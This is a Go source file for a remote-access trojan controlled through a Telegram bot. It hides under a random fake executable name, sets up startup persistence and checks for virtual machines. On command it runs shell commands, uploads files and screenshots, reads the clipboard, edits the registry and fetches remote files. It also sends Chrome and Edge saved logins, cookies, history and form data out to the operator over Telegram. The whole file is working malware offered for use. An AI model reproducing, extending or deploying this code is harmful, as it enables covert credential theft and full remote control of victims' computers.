package main

import (
	"log"
	"math/rand"
	"os"
	"strings"

	conf "payload/config"
	lib "payload/internal"

	tg "github.com/go-telegram-bot-api/telegram-bot-api"
)

func main() {
	FAKENAME := &conf.ARR_NNAME[rand.Intn(8)]
	f := &lib.FileInf{
		FileName: strings.TrimSuffix(*FAKENAME, ".exe"), //Name of the new registry string.
		NNAME:    *FAKENAME,
	}
	f.Startup()
	f.RuntimeVM()

	bot, err := tg.NewBotAPI(conf.API)
	if err != nil {
		log.Panic(err)
	}
	bot.Debug = conf.DEBUG_MODE

	u := tg.NewUpdate(0)
	u.Timeout = conf.TIMEOUT

	updates, err := bot.GetUpdatesChan(u)
	if err != nil {
		log.Panic(err)
	}

	for update := range updates {
		if update.Message != nil {
			telComd := update.Message.Command()
			chatID := update.Message.Chat.ID
			msg := tg.NewMessage(chatID, "")

			/*
				Use to set-up Telegram command.
			*/
			command := func() string {
				return strings.Trim(update.Message.Text, "/"+telComd)
			}

			if conf.MSG_REPLY {
				msg.ReplyToMessageID = update.Message.MessageID
			}

			go func() {
				switch telComd {
				case "help", "start":
					msg.Text = conf.HELP
				case "kill":
					os.Exit(0)
				case "remove":
					f.SelfRemove()
				case "shell", "sh":
					msg.Text = f.RShell(command())
				case "download":
					msg.Text = "download " + lib.Argument(command(), " ", 1)
					bot.Send(tg.NewDocumentUpload(chatID, lib.Argument(command(), " ", 1)))
				case "webload":
					f.FileName = lib.Argument(command(), " ", 1)
					msg.Text = f.WebLoad(lib.Argument(command(), " ", 2))
				case "screen":
					f.FileName = lib.Argument(command(), " ", 1)
					msg.Text = f.CaptureScreen()
				case "geoip":
					f.FileName = lib.Argument(command(), " ", 1)
					msg.Text = f.GeoIP()
				case "registry":
					msg.Text = lib.RegistryMethod(lib.Argument(command(), " ", 1),
						lib.Argument(command(), " ", 2),
						lib.Argument(command(), " ", 3),
						lib.Argument(command(), " ", 4))
				case "browser":
					switch lib.Argument(command(), " ", 1) {
					case "--dc":
						bot.Send(tg.NewDocumentUpload(chatID, lib.CurrentUser()+"Local\\Google\\Chrome\\User Data\\Default\\Login Data"))
						bot.Send(tg.NewDocumentUpload(chatID, lib.CurrentUser()+"Local\\Google\\Chrome\\User Data\\Default\\History"))
						bot.Send(tg.NewDocumentUpload(chatID, lib.CurrentUser()+"Local\\Google\\Chrome\\User Data\\Default\\Bookmarks"))
						bot.Send(tg.NewDocumentUpload(chatID, lib.CurrentUser()+"Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies"))
						bot.Send(tg.NewDocumentUpload(chatID, lib.CurrentUser()+"Local\\Google\\Chrome\\User Data\\Default\\Web Data"))
					case "--dm":
						bot.Send(tg.NewDocumentUpload(chatID, lib.CurrentUser()+"Local\\Microsoft\\Edge\\User Data\\Default\\Login Data"))
						bot.Send(tg.NewDocumentUpload(chatID, lib.CurrentUser()+"Local\\Microsoft\\Edge\\User Data\\Default\\History"))
						bot.Send(tg.NewDocumentUpload(chatID, lib.CurrentUser()+"Local\\Microsoft\\Edge\\User Data\\Default\\Bookmarks"))
						bot.Send(tg.NewDocumentUpload(chatID, lib.CurrentUser()+"Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies"))
						bot.Send(tg.NewDocumentUpload(chatID, lib.CurrentUser()+"Local\\Microsoft\\Edge\\User Data\\Default\\Web Data"))
					default:
						msg.Text = "Can not find method name \"" + lib.Argument(command(), " ", 1) + "\""
					}
				case "clipboard":
					msg.Text = f.GetClipboard()
				}
				bot.Send(msg)
			}()
		}
	}
}
